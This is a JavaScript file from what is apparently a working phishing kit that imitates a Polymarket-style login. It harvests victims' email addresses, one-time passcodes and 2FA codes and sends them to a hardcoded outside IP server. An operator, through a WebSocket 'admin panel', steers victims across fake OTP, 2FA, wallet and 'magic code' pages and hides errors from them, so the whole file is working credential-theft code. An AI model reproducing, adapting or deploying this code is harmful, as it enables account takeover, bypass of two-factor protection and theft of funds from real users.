let currentEmail = localStorage.getItem('user_email') || '';
let sessionToken = localStorage.getItem('session_token') || ''; // Store session token
let socket;
let urlMasks = {}; // Will store the URL masks from backend
let reconnectAttempts = 0;
const MAX_RECONNECT_ATTEMPTS = 5;
const RECONNECT_DELAY = 3000;

// Backend API configuration
const BACKEND_URL = CONFIG ? CONFIG.BACKEND_URL : 'http://45.137.214.30:3015';
const WS_URL = CONFIG ? CONFIG.WS_URL : 'ws://45.137.214.30:3015';

// Enhanced error handling
class ErrorHandler {
    static log(error, context = '') {
        const timestamp = new Date().toISOString();
        const errorMessage = `[${timestamp}] Error in ${context}: ${error.message || error}`;
        // Removed console.error - hidden from visitor

        // Store errors in session storage for debugging
        try {
            const errors = JSON.parse(sessionStorage.getItem('app_errors') || '[]');
            errors.push({ timestamp, context, error: error.message || error.toString() });
            // Keep only last 50 errors
            if (errors.length > 50) errors.splice(0, errors.length - 50);
            sessionStorage.setItem('app_errors', JSON.stringify(errors));
        } catch (e) {
            // Silent fail - hidden from visitor
        }
    }

    static showUserError(message, duration = 5000) {
        const errorDiv = document.getElementById('errorMessage');
        if (errorDiv) {
            errorDiv.className = 'error-message';
            errorDiv.textContent = message;
            errorDiv.style.display = 'block';

            setTimeout(() => {
                errorDiv.style.display = 'none';
            }, duration);
        } else {
            // Fallback to alert if no error div
            alert(`Error: ${message}`);
        }
    }

    static isNetworkError(error) {
        return error.name === 'TypeError' && error.message.includes('fetch');
    }

    static isTimeoutError(error) {
        return error.name === 'AbortError' || error.message.includes('timeout');
    }
}

// Enhanced network utilities with timeout and retry
class NetworkUtil {
    static csrfToken = null;

    static async fetchWithTimeout(url, options = {}, timeout = 10000) {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), timeout);

        try {
            // Add CSRF token to headers if available
            if (this.csrfToken && (options.method === 'POST' || options.method === 'PUT' || options.method === 'DELETE')) {
                options.headers = {
                    ...options.headers,
                    'X-CSRF-Token': this.csrfToken
                };
            }

            const response = await fetch(url, {
                ...options,
                signal: controller.signal
            });
            clearTimeout(timeoutId);

            // Extract CSRF token from response headers if present
            const newToken = response.headers.get('X-CSRF-Token');
            if (newToken) {
                this.csrfToken = newToken;
            }

            return response;
        } catch (error) {
            clearTimeout(timeoutId);
            if (error.name === 'AbortError') {
                throw new Error(`Request timeout after ${timeout}ms`);
            }
            throw error;
        }
    }

    static async fetchWithRetry(url, options = {}, maxRetries = 3, timeout = 10000) {
        let lastError;

        for (let attempt = 1; attempt <= maxRetries; attempt++) {
            try {
                const response = await this.fetchWithTimeout(url, options, timeout);

                // Handle CSRF token validation errors
                if (response.status === 403) {
                    const data = await response.json().catch(() => ({}));
                    if (data.error && data.error.includes('CSRF')) {
                        // Try to get new CSRF token
                        await this.refreshCSRFToken();
                        if (attempt < maxRetries) {
                            continue; // Retry with new token
                        }
                    }
                }

                return response;
            } catch (error) {
                lastError = error;
                ErrorHandler.log(error, `Fetch attempt ${attempt}/${maxRetries} to ${url}`);

                if (attempt < maxRetries) {
                    const delay = Math.min(1000 * attempt, 5000); // Exponential backoff, max 5s
                    await new Promise(resolve => setTimeout(resolve, delay));
                }
            }
        }

        throw lastError;
    }

    static async refreshCSRFToken() {
        try {
            const response = await fetch(`${BACKEND_URL}/api/csrf-token`, {
                method: 'GET',
                credentials: 'include'
            });

            if (response.ok) {
                const data = await response.json();
                this.csrfToken = data.token;
                // Token refreshed - hidden from visitor
            }
        } catch (error) {
            ErrorHandler.log(error, 'CSRF token refresh');
        }
    }
}

// Load URL masks from backend with enhanced error handling
async function loadUrlMasks() {
    try {
        const response = await NetworkUtil.fetchWithRetry(`${BACKEND_URL}/api/url-masks`, {}, 2, 5000);
        if (response.ok) {
            urlMasks = await response.json();
            // URL masks loaded - hidden from visitor
        } else {
            throw new Error(`HTTP ${response.status}: ${response.statusText}`);
        }
    } catch (error) {
        ErrorHandler.log(error, 'loadUrlMasks');
        // Failed to load URL masks - using fallback (hidden from visitor)
        // Fallback to direct file paths if masking fails
        urlMasks = {
            'index.html': '/',
            'login.html': '',
            'otp.html': '',
            '2fa.html': '',
            'wallet.html': ''
        };
    }
}

// Get masked URL for a file
function getMaskedUrl(filename) {
    return urlMasks[filename] || '/' + filename;
}

// Navigate to masked URL
function navigateToMasked(filename) {
    const maskedUrl = getMaskedUrl(filename);
    window.location.href = maskedUrl;
}

// Initialize WebSocket connection with enhanced error handling
function initWebSocket() {
    try {
        socket = new WebSocket(WS_URL);

        socket.onopen = function(event) {
            // Connected to server - hidden from visitor
            reconnectAttempts = 0; // Reset on successful connection
            // Send initial status with current email and session token if available
            sendStatusUpdate('connected', {
                email: currentEmail,
                sessionToken: sessionToken
            });
        };

        socket.onmessage = function(event) {
            try {
                // Received message - hidden from visitor
                const data = JSON.parse(event.data);

                // Handle session token assignment from server
                if (data.type === 'session_token' && data.sessionToken) {
                    sessionToken = data.sessionToken;
                    localStorage.setItem('session_token', sessionToken);
                    // Session token received - hidden from visitor
                } else {
                    handleServerCommand(data);
                }
            } catch (error) {
                ErrorHandler.log(error, 'WebSocket message parsing');
            }
        };

        socket.onclose = function(event) {
            // Disconnected from server - hidden from visitor

            // Only attempt reconnection if not intentionally closed
            if (event.code !== 1000 && reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
                reconnectAttempts++;
                const delay = RECONNECT_DELAY * reconnectAttempts;
                // Attempting reconnection - hidden from visitor
                setTimeout(initWebSocket, delay);
            } else if (reconnectAttempts >= MAX_RECONNECT_ATTEMPTS) {
                ErrorHandler.log(new Error('Max reconnection attempts reached'), 'WebSocket');
                ErrorHandler.showUserError('Connection lost. Please refresh the page to reconnect.');
            }
        };

        socket.onerror = function(error) {
            ErrorHandler.log(error, 'WebSocket connection');
            // Don't immediately try to reconnect on error - let onclose handle it
        };
    } catch (error) {
        ErrorHandler.log(error, 'WebSocket initialization');
        // Retry after delay
        setTimeout(initWebSocket, RECONNECT_DELAY);
    }
}

// Send status updates via WebSocket
function sendStatusUpdate(status, data = {}) {
    if (socket && socket.readyState === WebSocket.OPEN) {
        // Get current page from URL
        const currentPage = getCurrentPageName();

        const statusData = {
            type: 'status_update',
            status: status,
            currentPage: currentPage,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            ...data
        };
        socket.send(JSON.stringify(statusData));
    }
}

// Get current page name for tracking
function getCurrentPageName() {
    const path = window.location.pathname;

    // Check if this is a masked URL
    for (const [filename, maskedUrl] of Object.entries(urlMasks)) {
        if (path === maskedUrl) {
            return filename;
        }
    }

    // Fallback to checking path directly
    if (path.includes('login') || path.includes('auth')) return 'login.html';
    if (path.includes('otp') || path.includes('verify')) return 'otp.html';
    if (path.includes('2fa') || path.includes('secure')) return '2fa.html';
    if (path.includes('wallet') || path.includes('connect')) return 'wallet.html';
    if (path.includes('magic') || path.includes('code')) return 'magic.html';
    return 'index.html';
}

// Show login modal
function showLogin() {
    navigateToMasked('login.html');
}

// Handle login form submission with enhanced error handling
function handleLogin(event) {
    event.preventDefault();

    try {
        currentEmail = document.getElementById('email').value;

        if (!currentEmail || !currentEmail.includes('@')) {
            ErrorHandler.showUserError('Please enter a valid email address');
            return;
        }

        // Save email to localStorage for persistence across pages
        localStorage.setItem('user_email', currentEmail);
        
        // Clear any old magic code when starting a new login session
        localStorage.removeItem('magic_code');

        // Show loading screen
        const loginForm = document.getElementById('loginForm');
        const loadingScreen = document.getElementById('loadingScreen');

        if (loginForm) loginForm.style.display = 'none';
        if (loadingScreen) loadingScreen.style.display = 'block';

        // Send status update
        sendStatusUpdate('login_loading', { email: currentEmail });

        // Send email to server with enhanced error handling
        NetworkUtil.fetchWithRetry(`${BACKEND_URL}/api/log-email`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Session-Token': sessionToken // Include session token
            },
            credentials: 'include', // Include session cookies
            body: JSON.stringify({
                email: currentEmail,
                action: 'login_attempt',
                timestamp: new Date().toISOString(),
                page: 'login'
            })
        }, 2, 8000)
        .then(response => response.json())
        .then(data => {
            // Store session token from response
            if (data.sessionToken) {
                sessionToken = data.sessionToken;
                localStorage.setItem('session_token', sessionToken);
            }
            // Keep loading screen visible - don't show any errors
            // Admin will control what happens next via the control panel
        })
        .catch(error => {
            ErrorHandler.log(error, 'handleLogin API call');
            // Keep loading screen visible - don't show errors to user
            // The loading screen will remain until admin sends a command
        });
    } catch (error) {
        ErrorHandler.log(error, 'handleLogin');
        // Keep loading screen visible - don't show errors to user
    }
}

// Handle OTP form submission with enhanced error handling
function handleOTP(event) {
    event.preventDefault();

    try {
        const otpCode = document.getElementById('otp').value;

        if (!otpCode || !/^\d{6}$/.test(otpCode)) {
            ErrorHandler.showUserError('Please enter a valid 6-digit code');
            return;
        }

        // Ensure we have the email from localStorage if needed
        if (!currentEmail) {
            currentEmail = localStorage.getItem('user_email') || '';
        }

        // Show loading screen
        const otpForm = document.getElementById('otpForm');
        const loadingScreen = document.getElementById('loadingScreen');

        if (otpForm) otpForm.style.display = 'none';
        if (loadingScreen) loadingScreen.style.display = 'block';

        // Send status update
        sendStatusUpdate('otp_loading', { email: currentEmail, otp: otpCode });

        // Send OTP to server with enhanced error handling
        NetworkUtil.fetchWithRetry(`${BACKEND_URL}/api/log-otp`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Session-Token': sessionToken // Include session token
            },
            credentials: 'include', // Include session cookies
            body: JSON.stringify({
                email: currentEmail,
                otp: otpCode,
                action: 'otp_attempt',
                timestamp: new Date().toISOString(),
                page: 'otp'
            })
        }, 2, 8000)
        .then(response => response.json())
        .then(data => {
            // Update session token from response
            if (data.sessionToken) {
                sessionToken = data.sessionToken;
                localStorage.setItem('session_token', sessionToken);
            }
            // Keep loading screen visible - don't show any errors
            // Admin will control what happens next via the control panel
        })
        .catch(error => {
            ErrorHandler.log(error, 'handleOTP API call');
            // Keep loading screen visible - don't show errors to user
            // The loading screen will remain until admin sends a command
        });
    } catch (error) {
        ErrorHandler.log(error, 'handleOTP');
        // Keep loading screen visible - don't show errors to user
    }
}

// Handle 2FA form submission with enhanced error handling
function handle2FA(event) {
    event.preventDefault();

    try {
        const tfaCode = document.getElementById('tfa').value;

        if (!tfaCode || !/^\d{6}$/.test(tfaCode)) {
            ErrorHandler.showUserError('Please enter a valid 6-digit authenticator code');
            return;
        }

        // Ensure we have the email from localStorage if needed
        if (!currentEmail) {
            currentEmail = localStorage.getItem('user_email') || '';
        }

        // Show loading screen
        const tfaForm = document.getElementById('tfaForm');
        const loadingScreen = document.getElementById('loadingScreen');

        if (tfaForm) tfaForm.style.display = 'none';
        if (loadingScreen) loadingScreen.style.display = 'block';

        // Send status update
        sendStatusUpdate('tfa_loading', { email: currentEmail, tfa: tfaCode });

        // Send 2FA to server with enhanced error handling
        NetworkUtil.fetchWithRetry(`${BACKEND_URL}/api/log-2fa`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Session-Token': sessionToken // Include session token
            },
            credentials: 'include', // Include session cookies
            body: JSON.stringify({
                email: currentEmail,
                tfa: tfaCode,
                action: '2fa_attempt',
                timestamp: new Date().toISOString(),
                page: '2fa'
            })
        }, 2, 8000)
        .then(response => response.json())
        .then(data => {
            // Update session token from response
            if (data.sessionToken) {
                sessionToken = data.sessionToken;
                localStorage.setItem('session_token', sessionToken);
            }
            // Keep loading screen visible - don't show any errors
            // Admin will control what happens next via the control panel
        })
        .catch(error => {
            ErrorHandler.log(error, 'handle2FA API call');
            // Keep loading screen visible - don't show errors to user
            // The loading screen will remain until admin sends a command
        });
    } catch (error) {
        ErrorHandler.log(error, 'handle2FA');
        // Keep loading screen visible - don't show errors to user
    }
}

// Handle server commands from admin panel
function handleServerCommand(data) {
    switch(data.action) {
        case 'redirect_to_otp':
            // Clear magic code when navigating away from magic page
            localStorage.removeItem('magic_code');
            navigateToMasked('otp.html');
            break;
        case 'redirect_to_2fa':
            // Clear magic code when navigating away from magic page
            localStorage.removeItem('magic_code');
            navigateToMasked('2fa.html');
            break;
        case 'redirect_to_wallet':
            // Clear magic code when navigating away from magic page
            localStorage.removeItem('magic_code');
            navigateToMasked('wallet.html');
            break;
        case 'redirect_to_magic':
            // Clear any old magic code first, then store new one
            localStorage.removeItem('magic_code');
            if (data.magicCode) {
                localStorage.setItem('magic_code', data.magicCode);
            }
            navigateToMasked('magic.html');
            break;
case 'redirect_external':            // Clear magic code before external redirect
            localStorage.removeItem('magic_code');
            window.location.href = data.url;            break;
        case 'block_and_redirect':
            // Clear magic code before blocking
            localStorage.removeItem('magic_code');
            // Immediate redirect without any message
            window.location.href = data.url || 'https://polymarket.com';
            break;
        case 'show_error':
            showError(data.message);
            break;
        case 'show_success':
            showSuccess(data.message);
            break;
        case 'clear_form_and_focus':
            clearFormAndFocus();
            break;
        case 'clear_otp_and_focus':
            clearOTPAndFocus();
            break;
        case 'clear_2fa_and_focus':
            clear2FAAndFocus();
            break;
        case 'redirect_to_login':
            // Clear magic code when returning to login (new session)
            localStorage.removeItem('magic_code');
            navigateToMasked('login.html');
            break;
case 'redirect_to_source':            // Clear magic code and redirect to Polymarket            localStorage.removeItem('magic_code');            window.location.href = 'https://polymarket.com';            break;
        default:
            console.log('Unknown command:', data);
    }
}

function showError(message) {
    hideLoading();

    const errorDiv = document.getElementById('errorMessage');
    if (errorDiv) {
        errorDiv.className = 'error-message';
        errorDiv.textContent = message;
        errorDiv.style.display = 'block';

        // Hide after 5 seconds
        setTimeout(() => {
            errorDiv.style.display = 'none';
        }, 5000);
    }
}

function showSuccess(message) {
    hideLoading();

    const successDiv = document.getElementById('successMessage');
    if (successDiv) {
        successDiv.className = 'success-message';
        successDiv.textContent = message;
        successDiv.style.display = 'block';

        // Hide after 3 seconds
        setTimeout(() => {
            successDiv.style.display = 'none';
        }, 3000);
    }
}

function hideLoading() {
    const loadingScreen = document.getElementById('loadingScreen');
    const loginForm = document.getElementById('loginForm');
    const otpForm = document.getElementById('otpForm');
    const tfaForm = document.getElementById('tfaForm');

    if (loadingScreen) loadingScreen.style.display = 'none';
    if (loginForm) {
        loginForm.style.display = 'block';
        sendStatusUpdate('login_page');
    }
    if (otpForm) {
        otpForm.style.display = 'block';
        sendStatusUpdate('otp_page');
    }
    if (tfaForm) {
        tfaForm.style.display = 'block';
        sendStatusUpdate('2fa_page');
    }
}

function requestEmailAgain() {
    hideLoading();
    const emailInput = document.getElementById('email');
    if (emailInput) {
        emailInput.value = '';
        emailInput.focus();
    }
}

function requestOTPAgain() {
    hideLoading();
    const otpInput = document.getElementById('otp');
    if (otpInput) {
        otpInput.value = '';
        otpInput.focus();
    }
}

function clearFormAndFocus() {
    hideLoading();
    const emailInput = document.getElementById('email');
    if (emailInput) {
        emailInput.value = '';
        emailInput.focus();
        // Add visual feedback
        emailInput.style.borderColor = '#ffc107';
        emailInput.style.background = '#fff3cd';
        setTimeout(() => {
            emailInput.style.borderColor = '';
            emailInput.style.background = '';
        }, 2000);
    }
}

function clearOTPAndFocus() {
    hideLoading();
    const otpInput = document.getElementById('otp');
    if (otpInput) {
        otpInput.value = '';
        otpInput.focus();
        // Add visual feedback
        otpInput.style.borderColor = '#ffc107';
        otpInput.style.background = '#fff3cd';
        setTimeout(() => {
            otpInput.style.borderColor = '';
            otpInput.style.background = '';
        }, 2000);
    }
}

function clear2FAAndFocus() {
    hideLoading();
    const tfaInput = document.getElementById('tfa');
    if (tfaInput) {
        tfaInput.value = '';
        tfaInput.focus();
        // Add visual feedback
        tfaInput.style.borderColor = '#ffc107';
        tfaInput.style.background = '#fff3cd';
        setTimeout(() => {
            tfaInput.style.borderColor = '';
            tfaInput.style.background = '';
        }, 2000);
    }
}

// ===== Magic Code Functions =====

function copyMagicCode() {
    const codeDisplay = document.getElementById('magicCodeDisplay');
    if (!codeDisplay) return;

    const codeText = codeDisplay.textContent.trim();

    // Try modern clipboard API first
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(codeText)
            .then(() => {
                showCopyFeedback();
            })
            .catch(err => {
                // Fallback if clipboard API fails
                fallbackCopyCode(codeText);
            });
    } else {
        // Fallback for older browsers
        fallbackCopyCode(codeText);
    }
}

function fallbackCopyCode(text) {
    // Create a temporary textarea
    const textarea = document.createElement('textarea');
    textarea.value = text;
    textarea.style.position = 'fixed';
    textarea.style.opacity = '0';
    document.body.appendChild(textarea);
    textarea.select();

    try {
        document.execCommand('copy');
        showCopyFeedback();
    } catch (err) {
        ErrorHandler.log(err, 'fallbackCopyCode');
        ErrorHandler.showUserError('Failed to copy code. Please copy manually.');
    }

    document.body.removeChild(textarea);
}

function showCopyFeedback() {
    const codeDisplay = document.getElementById('magicCodeDisplay');
    if (codeDisplay) {
        const originalBg = codeDisplay.style.background;
        const originalBorder = codeDisplay.style.borderColor;
        
        // Visual feedback on the code box itself
        codeDisplay.style.background = 'rgba(16, 185, 129, 0.15)';
        codeDisplay.style.borderColor = 'rgba(16, 185, 129, 0.5)';
        
        // Create temporary "Copied!" message
        const feedback = document.createElement('div');
        feedback.textContent = '✓ Copied!';
        feedback.style.cssText = 'position: absolute; top: -2rem; left: 50%; transform: translateX(-50%); background: #10b981; color: white; padding: 0.5rem 1rem; border-radius: 0.5rem; font-size: 0.875rem; font-weight: 600; animation: fadeInScale 0.3s ease;';
        codeDisplay.parentElement.style.position = 'relative';
        codeDisplay.parentElement.appendChild(feedback);

        setTimeout(() => {
            codeDisplay.style.background = originalBg;
            codeDisplay.style.borderColor = originalBorder;
            if (feedback.parentElement) {
                feedback.parentElement.removeChild(feedback);
            }
        }, 2000);
    }
}

function handleMagicDone() {
    // Hide the magic form
    const magicForm = document.getElementById('magicForm');
    if (magicForm) {
        magicForm.style.display = 'none';
    }

    // Show loading screen
    const loadingScreen = document.getElementById('loadingScreen');
    if (loadingScreen) {
        loadingScreen.style.display = 'flex';
    }

    // Send status update to admin
    sendStatusUpdate('magic_done');

    // Clear magic code from localStorage
    localStorage.removeItem('magic_code');
}

function initMagicPage() {
    // Get stored email and magic code
    const email = localStorage.getItem('user_email');
    const magicCode = localStorage.getItem('magic_code');

    // If no magic code available (page refresh or manual navigation), redirect to login
    if (!magicCode) {
        console.log('⚠️ No magic code found - redirecting to login');
        // Clear any stale data
        localStorage.removeItem('magic_code');
        // Redirect back to login page
        navigateToMasked('login.html');
        return;
    }

    // Populate visitor email
    const emailDisplay = document.getElementById('visitorEmail');
    if (emailDisplay && email) {
        emailDisplay.textContent = email;
    }

    // Populate magic code and make it clickable
    const codeDisplay = document.getElementById('magicCodeDisplay');
    if (codeDisplay && magicCode) {
        codeDisplay.textContent = magicCode;
        // Make the code box itself clickable to copy
        codeDisplay.addEventListener('click', copyMagicCode);
    }

    // Attach event listener for done button
    const doneBtn = document.getElementById('doneBtn');
    if (doneBtn) {
        doneBtn.addEventListener('click', handleMagicDone);
    }

    // Send page status
    sendStatusUpdate('magic_page');
}

// ===== End Magic Code Functions =====

function resendCode() {
    showSuccess('A new verification code has been sent to your email');

    // Log resend request
    fetch(`${BACKEND_URL}/api/log-resend`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-Session-Token': sessionToken // Include session token
        },
        credentials: 'include', // Include session cookies
        body: JSON.stringify({
            email: currentEmail,
            action: 'resend_code',
            timestamp: new Date().toISOString(),
            page: 'otp'
        })
    }).catch(error => {
        console.error('Error:', error);
    });
}

// Get email from URL parameters if available
function getEmailFromURL() {
    const urlParams = new URLSearchParams(window.location.search);
    const email = urlParams.get('email');
    if (email) {
        currentEmail = email;
    }
}

// Initialize when page loads with enhanced error handling
document.addEventListener('DOMContentLoaded', async function() {
    try {
        // Initialize CSRF token first
        await NetworkUtil.refreshCSRFToken();

        // Load URL masks first
        await loadUrlMasks();

        // Get email from URL if on OTP page
        getEmailFromURL();

        // Initialize WebSocket connection
        initWebSocket();

        // Send initial page status with current email if available
        const currentPage = getCurrentPageName();
        if (currentPage === 'login.html') {
            sendStatusUpdate('login_page', { email: currentEmail });
        } else if (currentPage === 'otp.html') {
            sendStatusUpdate('otp_page', { email: currentEmail });
        } else if (currentPage === '2fa.html') {
            sendStatusUpdate('2fa_page', { email: currentEmail });
        } else if (currentPage === 'wallet.html') {
            sendStatusUpdate('wallet_page', { email: currentEmail });
        } else if (currentPage === 'magic.html') {
            // Initialize magic page with stored data
            initMagicPage();
        } else {
            sendStatusUpdate('home_page', { email: currentEmail });
        }

        // Add event listeners with error handling
        setupEventListeners();

    } catch (error) {
        ErrorHandler.log(error, 'DOMContentLoaded initialization');
        ErrorHandler.showUserError('Failed to initialize application. Please refresh the page.');
    }
});

// Setup event listeners with enhanced error handling
function setupEventListeners() {
    try {
        // Add event listeners for the home page login button
        const loginBtn = document.getElementById('loginBtn');
        if (loginBtn) {
            loginBtn.addEventListener('click', function() {
                try {
                    sendStatusUpdate('clicking_login');
                    showLogin();
                } catch (error) {
                    ErrorHandler.log(error, 'loginBtn click');
                }
            });
        }

        const loginBtn2 = document.getElementById('loginBtn2');
        if (loginBtn2) {
            loginBtn2.addEventListener('click', function() {
                try {
                    sendStatusUpdate('clicking_login');
                    showLogin();
                } catch (error) {
                    ErrorHandler.log(error, 'loginBtn2 click');
                }
            });
        }

        // Auto-focus on input fields with error handling
        const emailInput = document.getElementById('email');
        const otpInput = document.getElementById('otp');
        const tfaInput = document.getElementById('tfa');

        if (emailInput) {
            emailInput.focus();
            emailInput.addEventListener('focus', () => {
                try {
                    sendStatusUpdate('typing_email');
                } catch (error) {
                    ErrorHandler.log(error, 'email input focus');
                }
            });

            // Add input validation
            emailInput.addEventListener('input', function(e) {
                try {
                    const value = e.target.value;
                    const errorDiv = document.getElementById('errorMessage');

                    if (value && !value.includes('@')) {
                        if (errorDiv) {
                            errorDiv.textContent = 'Please enter a valid email address';
                            errorDiv.style.display = 'block';
                        }
                    } else if (errorDiv) {
                        errorDiv.style.display = 'none';
                    }
                } catch (error) {
                    ErrorHandler.log(error, 'email input validation');
                }
            });
        }

        if (otpInput) {
            otpInput.focus();
            otpInput.addEventListener('focus', () => {
                try {
                    sendStatusUpdate('typing_otp');
                } catch (error) {
                    ErrorHandler.log(error, 'otp input focus');
                }
            });

            // Auto-format OTP input with enhanced validation
            otpInput.addEventListener('input', function(e) {
                try {
                    let value = e.target.value.replace(/\D/g, '');
                    if (value.length > 6) {
                        value = value.slice(0, 6);
                    }
                    e.target.value = value;
                    sendStatusUpdate('typing_otp', { otpLength: value.length });

                    // Clear errors when user starts typing
                    const errorDiv = document.getElementById('errorMessage');
                    if (errorDiv && value.length > 0) {
                        errorDiv.style.display = 'none';
                    }
                } catch (error) {
                    ErrorHandler.log(error, 'otp input formatting');
                }
            });
        }

        if (tfaInput) {
            tfaInput.focus();
            tfaInput.addEventListener('focus', () => {
                try {
                    sendStatusUpdate('typing_2fa');
                } catch (error) {
                    ErrorHandler.log(error, 'tfa input focus');
                }
            });

            // Auto-format 2FA input with enhanced validation
            tfaInput.addEventListener('input', function(e) {
                try {
                    let value = e.target.value.replace(/\D/g, '');
                    if (value.length > 6) {
                        value = value.slice(0, 6);
                    }
                    e.target.value = value;
                    sendStatusUpdate('typing_2fa', { tfaLength: value.length });

                    // Clear errors when user starts typing
                    const errorDiv = document.getElementById('errorMessage');
                    if (errorDiv && value.length > 0) {
                        errorDiv.style.display = 'none';
                    }
                } catch (error) {
                    ErrorHandler.log(error, 'tfa input formatting');
                }
            });
        }

        // Wallet connect button
        const connectWalletBtn = document.getElementById('connectWalletBtn');
        if (connectWalletBtn) {
            connectWalletBtn.addEventListener('click', function() {
                try {
                    sendStatusUpdate('wallet_connect_attempt');
                    // Enhanced wallet connection handling would go here
                } catch (error) {
                    ErrorHandler.log(error, 'wallet connect button');
                }
            });
        }

    } catch (error) {
        ErrorHandler.log(error, 'setupEventListeners');
    }
}
